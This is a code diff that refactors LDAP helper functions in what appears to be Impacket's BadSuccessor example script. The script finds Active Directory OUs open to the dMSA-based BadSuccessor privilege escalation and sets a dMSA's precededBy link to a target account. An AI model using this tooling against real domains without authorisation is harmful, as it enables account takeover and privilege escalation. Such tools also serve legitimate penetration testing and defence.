@@ -29,8 +29,11 @@ import sys
 
 from impacket import version
 from impacket.examples import logger
-from impacket.examples.utils import parse_identity, parse_target, ldap_login
+from impacket.examples.utils import (parse_identity, parse_target, ldap_login,
+                                      as_bytes, as_string, as_sid_string,
+                                      search_entries)
 from impacket.ldap import ldap, ldapasn1, ldaptypes
+from impacket.ldap.ldap import get_entry_dn, get_entry_value, get_entry_values
 
 
 class BADSUCCESSOR:
@@ -80,68 +83,6 @@ class BADSUCCESSOR:
                 self.__port = 389
             elif self.__method == 'LDAPS':
                 self.__port = 636
-
-    @staticmethod
-    def _entry_dn(entry):
-        return str(entry['objectName'])
-
-    @staticmethod
-    def _get_entry_values(entry, attribute_name):
-        for attribute in entry['attributes']:
-            if str(attribute['type']).lower() == attribute_name.lower():
-                return list(attribute['vals'])
-        return []
-
-    @classmethod
-    def _get_entry_value(cls, entry, attribute_name):
-        values = cls._get_entry_values(entry, attribute_name)
-        return values[0] if values else None
-
-    @staticmethod
-    def _as_bytes(value):
-        if value is None:
-            return None
-        if hasattr(value, 'asOctets'):
-            return value.asOctets()
-        if isinstance(value, bytes):
-            return value
-        return bytes(value)
-
-    @classmethod
-    def _as_string(cls, value):
-        if value is None:
-            return None
-        if isinstance(value, bytes):
-            return value.decode('utf-8')
-        if hasattr(value, 'asOctets'):
-            try:
-                return value.asOctets().decode('utf-8')
-            except UnicodeDecodeError:
-                return str(value)
-        return str(value)
-
-    @classmethod
-    def _as_sid_string(cls, value):
-        if value is None:
-            return None
-        if isinstance(value, str) and value.startswith('S-'):
-            return value
-        sid_bytes = cls._as_bytes(value)
-        if sid_bytes is None:
-            return None
-        return ldaptypes.LDAP_SID(data=sid_bytes).formatCanonical()
-
-    @classmethod
-    def _search_entries(cls, ldapConnection, search_filter, search_base=None, search_scope=None, attributes=None,
-                        search_controls=None):
-        response = ldapConnection.search(
-            searchBase=search_base,
-            searchFilter=search_filter,
-            scope=search_scope,
-            attributes=attributes,
-            searchControls=search_controls,
-        )
-        return [item for item in response if isinstance(item, ldapasn1.SearchResultEntry)]
 
     def run(self):
         # Create the baseDN if not provided
@@ -228,10 +169,10 @@ class BADSUCCESSOR:
     
     def check_account_exists(self, ldapConnection, dn):
         try:
-            entries = self._search_entries(
+            entries = search_entries(
                 ldapConnection,
                 '(objectClass=*)',
-                search_base=dn,
+                dn,
                 search_scope=self.LDAP_SCOPE_BASE,
                 attributes=['cn']
             )
@@ -246,23 +187,23 @@ class BADSUCCESSOR:
         try:
             logging.info('Searching for OUs vulnerable to BadSuccessor attack...')
 
-            dc_entries = self._search_entries(
+            dc_entries = search_entries(
                 ldapConnection,
                 '(&(objectCategory=computer)(objectClass=computer)(userAccountControl:1.2.840.113556.1.4.803:=8192))',
-                search_base=self.__baseDN,
+                self.__baseDN,
                 search_scope=self.LDAP_SCOPE_SUBTREE,
                 attributes=['operatingSystem', 'operatingSystemVersion']
             )
             prereq_flag = False
             for entry in dc_entries:
-                operating_system = self._as_string(self._get_entry_value(entry, 'operatingSystem'))
-                operating_system_version = self._as_string(self._get_entry_value(entry, 'operatingSystemVersion'))
+                operating_system = as_string(get_entry_value(entry, 'operatingSystem'))
+                operating_system_version = as_string(get_entry_value(entry, 'operatingSystemVersion'))
                 if not operating_system or not operating_system_version:
-                    logging.error('Could not retrieve operating system information for Domain Controller: %s' % self._entry_dn(entry))
+                    logging.error('Could not retrieve operating system information for Domain Controller: %s' % get_entry_dn(entry))
                     continue
 
                 if 'Windows Server 2025' in operating_system or '26100' in operating_system_version:
-                    logging.info('Found Windows Server 2025 Domain Controller: %s' % self._entry_dn(entry))
+                    logging.info('Found Windows Server 2025 Domain Controller: %s' % get_entry_dn(entry))
                     prereq_flag = True
                     break
             
@@ -270,10 +211,10 @@ class BADSUCCESSOR:
                 logging.info('No Windows Server 2025 Domain Controllers found. This script requires at least one DC running Windows Server 2025.')
                 logging.info('Resulting list of Identities/OUs will show Identities that have permissions to create objects in OUs.')
                     
-            ou_entries = self._search_entries(
+            ou_entries = search_entries(
                 ldapConnection,
                 '(objectClass=organizationalUnit)',
-                search_base=self.__baseDN,
+                self.__baseDN,
                 search_scope=self.LDAP_SCOPE_SUBTREE,
                 attributes=['distinguishedName', 'nTSecurityDescriptor'],
                 search_controls=[ldapasn1.SDFlagsControl(flags=0x5)]
@@ -283,16 +224,16 @@ class BADSUCCESSOR:
             # Get domain SID for filtering excluded accounts
             domain_sid = None
             try:
-                domain_entries = self._search_entries(
+                domain_entries = search_entries(
                     ldapConnection,
                     '(objectClass=domain)',
-                    search_base=self.__baseDN,
+                    self.__baseDN,
                     search_scope=self.LDAP_SCOPE_BASE,
                     attributes=['objectSid']
                 )
 
                 if domain_entries:
-                    domain_sid = self._as_sid_string(self._get_entry_value(domain_entries[0], 'objectSid'))
+                    domain_sid = as_sid_string(get_entry_value(domain_entries[0], 'objectSid'))
             except Exception as e:
                 logging.error('Failed to retrieve domain SID: %s' % str(e))
                 return False
@@ -313,8 +254,8 @@ class BADSUCCESSOR:
             
             for entry in ou_entries:
                 try:
-                    ou_dn = self._entry_dn(entry)
-                    sd_data = self._as_bytes(self._get_entry_value(entry, 'nTSecurityDescriptor'))
+                    ou_dn = get_entry_dn(entry)
+                    sd_data = as_bytes(get_entry_value(entry, 'nTSecurityDescriptor'))
                     if not sd_data:
                         continue
 
@@ -422,16 +363,16 @@ class BADSUCCESSOR:
             if sid in well_known_sids:
                 return well_known_sids[sid]
             
-            entries = self._search_entries(
+            entries = search_entries(
                 ldapConnection,
                 '(objectSid=%s)' % sid,
-                search_base=self.__baseDN,
+                self.__baseDN,
                 search_scope=self.LDAP_SCOPE_SUBTREE,
                 attributes=['sAMAccountName']
             )
 
             if entries:
-                username = self._as_string(self._get_entry_value(entries[0], 'sAMAccountName'))
+                username = as_string(get_entry_value(entries[0], 'sAMAccountName'))
                 if username:
                     return '%s\\%s' % (self.__domain.upper(), username)
                     
@@ -579,14 +520,14 @@ class BADSUCCESSOR:
             group_msa_membership = None
             try:
                 search_filter = '(&(objectClass=user)(sAMAccountName=%s))' % principals_allowed
-                entries = self._search_entries(
+                entries = search_entries(
                     ldapConnection,
                     search_filter,
-                    search_base=self.__baseDN,
+                    self.__baseDN,
                     search_scope=self.LDAP_SCOPE_SUBTREE,
                     attributes=['objectSid'])
                 if entries:
-                    user_sid = self._as_sid_string(self._get_entry_value(entries[0], 'objectSid'))
+                    user_sid = as_sid_string(get_entry_value(entries[0], 'objectSid'))
                     if user_sid:
                         descriptor = self.build_security_descriptor(user_sid)
                         group_msa_membership = descriptor
@@ -600,22 +541,22 @@ class BADSUCCESSOR:
                 attributes['msDS-GroupMSAMembership'] = group_msa_membership
 
             target_dn = None
-            entries = self._search_entries(
+            entries = search_entries(
                 ldapConnection,
                 '(&(objectClass=*)(sAMAccountName=%s))' % target_account,
-                search_base=self.__baseDN,
+                self.__baseDN,
                 search_scope=self.LDAP_SCOPE_SUBTREE,
                 attributes=['distinguishedName', 'objectClass']
             )
 
             if entries:
                 for entry in entries:
-                    object_classes = [self._as_string(value).lower() for value in self._get_entry_values(entry, 'objectClass')]
+                    object_classes = [as_string(value).lower() for value in get_entry_values(entry, 'objectClass')]
                     if 'user' in object_classes or 'computer' in object_classes:
-                        target_dn = self._entry_dn(entry)
+                        target_dn = get_entry_dn(entry)
                         break
                 if target_dn is None:
-                    target_dn = self._entry_dn(entries[0])
+                    target_dn = get_entry_dn(entries[0])
 
                 if target_dn:
                     attributes['msDS-ManagedAccountPrecededByLink'] = target_dn
@@ -651,22 +592,22 @@ class BADSUCCESSOR:
                 return False
 
             # Get current target account value
-            entries = self._search_entries(
+            entries = search_entries(
                 ldapConnection,
                 '(objectClass=msDS-DelegatedManagedServiceAccount)',
-                search_base=dmsa_dn,
+                dmsa_dn,
                 search_scope=self.LDAP_SCOPE_BASE,
                 attributes=['msDS-ManagedAccountPrecededByLink']
             )
-            
+
             current_target_dn = None
             if entries:
-                current_target_dn = self._as_string(self._get_entry_value(entries[0], 'msDS-ManagedAccountPrecededByLink'))
+                current_target_dn = as_string(get_entry_value(entries[0], 'msDS-ManagedAccountPrecededByLink'))
 
-            entries = self._search_entries(
+            entries = search_entries(
                 ldapConnection,
                 '(&(objectClass=*)(sAMAccountName=%s))' % self.__targetAccount,
-                search_base=self.__baseDN,
+                self.__baseDN,
                 search_scope=self.LDAP_SCOPE_SUBTREE,
                 attributes=['distinguishedName', 'objectClass']
             )
@@ -677,13 +618,13 @@ class BADSUCCESSOR:
 
             target_dn = None
             for entry in entries:
-                object_classes = [self._as_string(value).lower() for value in self._get_entry_values(entry, 'objectClass')]
+                object_classes = [as_string(value).lower() for value in get_entry_values(entry, 'objectClass')]
                 if 'user' in object_classes or 'computer' in object_classes:
-                    target_dn = self._entry_dn(entry)
+                    target_dn = get_entry_dn(entry)
                     break
-            
+
             if not target_dn:
-                target_dn = self._entry_dn(entries[0])
+                target_dn = get_entry_dn(entries[0])
 
             if current_target_dn == target_dn:
                 logging.info('Target account is already set to: %s' % target_dn)
